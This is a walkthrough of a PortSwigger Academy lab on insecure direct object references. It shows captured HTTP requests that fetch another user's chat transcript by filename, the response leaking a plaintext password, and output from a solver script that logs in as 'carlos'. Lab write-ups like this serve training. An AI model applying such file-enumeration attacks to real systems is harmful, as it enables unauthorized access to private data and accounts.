# Lab: Insecure direct object references

### Instructions

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user `carlos`, and logging into their account. 

### Solution

Looking at the app there is a chat feature. We can initiate a chat and then click "View transcript." This downloads a file called `2.txt`.

Capturing this in Burp we see:

```
POST /download-transcript HTTP/1.1
```

We can change this to a GET request and begin looking for other messages to read.

Let's start with reading `1.txt`:

```
GET /download-transcript/1.txt HTTP/2
Host: 0a2a000a04a9d08d8208f145004d005c.web-security-academy.net
Cookie: session=9NNQ4CRML2ovuO58LKDNShqRPT425ehc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------98324402942102779503427332754
Content-Length: 2
Origin: https://0a2a000a04a9d08d8208f145004d005c.web-security-academy.net
Referer: https://0a2a000a04a9d08d8208f145004d005c.web-security-academy.net/chat
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
```

This contains a plaintext password:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is 8g7znyqo1uioblk2vuhl. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

We can use this password to sign in as user Carlos, which solves the lab.

### Python Solution

See `access_control_09.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_09_insecure_direct_object_references]
└─$ python access_control_09.py https://0a8b00c604c6321a80afadd00043002f.web-security-academy.net/
[*] Retrieving 1.txt message...
[+] Discovered password: r9mb5a6v1gp1yq32dx50
[+] Logged in as carlos, lab solved.
```